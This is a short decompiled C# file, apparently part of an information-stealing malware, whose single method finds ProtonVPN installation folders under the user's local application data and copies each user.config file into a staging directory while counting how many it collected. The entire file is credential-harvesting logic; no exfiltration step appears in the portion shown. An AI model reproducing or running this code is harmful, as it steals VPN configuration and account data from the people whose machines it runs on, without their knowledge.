using System;
using System.IO;

internal class Class47
{
	public static void smethod_0()
	{
		string string_ = Class38.string_11;
		string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ProtonVPN");
		if (!Directory.Exists(path))
		{
			return;
		}
		try
		{
			string[] directories = Directory.GetDirectories(path);
			foreach (string text in directories)
			{
				if (!text.Contains("ProtonVPN.exe"))
				{
					continue;
				}
				string[] directories2 = Directory.GetDirectories(text);
				for (int j = 0; j < directories2.Length; j++)
				{
					string text2 = directories2[j] + "\\user.config";
					string text3 = Path.Combine(string_ + "\\VPN\\ProtonVPN", new DirectoryInfo(Path.GetDirectoryName(text2)).Name);
					if (!Directory.Exists(text3))
					{
						Directory.CreateDirectory(text3);
						File.Copy(text2, text3 + "\\user.config");
						Class36.int_15++;
					}
				}
			}
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
		}
	}
}
